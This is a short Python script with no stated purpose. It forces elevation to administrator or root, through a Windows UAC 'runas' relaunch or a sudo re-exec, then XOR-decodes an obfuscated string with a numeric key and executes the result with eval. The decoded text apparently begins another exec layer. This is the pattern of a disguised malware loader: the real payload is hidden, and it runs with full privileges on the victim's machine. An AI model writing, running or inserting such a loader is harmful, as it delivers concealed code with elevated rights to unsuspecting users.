import os
import sys
import ctypes
import platform

def is_admin():
    if platform.system() == 'Windows':
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        # Unix-like systems
        return os.geteuid() == 0

if not is_admin():
    if platform.system() == 'Windows':
        # Re-run the script with admin rights on Windows
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
    else:
        # Re-run the script with sudo on Unix-like systems
        print("This script must be run as root. Please run it with sudo.")
        os.execvp("sudo", ["sudo", "python3"] + sys.argv)
    sys.exit()

print("")

wopvEaTEcopFEavc ="UOSQ\x11\x14\x13\x16m^X]AXCM\x13F]Z^]D\x1eL]QR\x14UTKQ\x00\x03\x14@MCCZ@\x1dM^_WeZWWJ\x18I\x15Y]\x11DY^SP\x1a\t\x04\x19\x08h\\\x11\x12\x15\x14\x14FKA\x0co]\x16\x14\x17\x14\x16\x13\x16\x15\x12J\x04JYP^]E\x19@_T]WM\x1e\x03\x18B_R[TC\x1fj|vyfflbww|\x11lV\x17\x15\x18\x14\x16\x17\x18\x13\x19B\x18Z[_WRQF\x11\x1c\x16wJYR\\_}DX]J\x19\x07\x03\x0e\x03\x00\x1cD]CFXUD\x1cQWEG\x14\x1a\x01\x05\x02\x0f\x06\x1f\x1cnW\x19\x19\x16\x13\x15\x18\x11\x17\x13RESSRj_\x14\x11\x10\x11\x10TOR\\CA\x08e[\x18\x10\x12\x16\x11\x18\x10\x18\x17\x15\x18@_Z]\x1dJ]S\\D\x19\x0c\x1en\\U\tBLJMRA\x1eF_FYS_\x1d\x15\x06}\x17\x1eG\x1cCWVB\x1c\x06\x10\x11m\x03njZS\tE\x1dDPQO\x11U\x1fo[OY^_U\x17ZWW\x1eU\x1d\r\\\x0bl_\x17\x11\x19\x13\x15\x12]\x1e\x05C\x1cDT[F\x10[\x18TQX\x1f\\\x1a\x10mX\\LTZ\x1fH^PV\x1f\\][^X@ATEK\x18VTA]\x02\x04\x1cV\x04\x05VPW[V\\\x10R\x1a\x1a\x1aO\x10G\x11\tEH\x1beW\x1b\x14\x11\x1c" 

iOpvEoeaaeavocp = "0762961410101719352958026180875846783916941972294188815031680452840242125442986336474636529996358173"
uocpEAtacovpe = len(wopvEaTEcopFEavc)
oIoeaTEAcvpae = ""
for fapcEaocva in range(uocpEAtacovpe):
    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))


eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))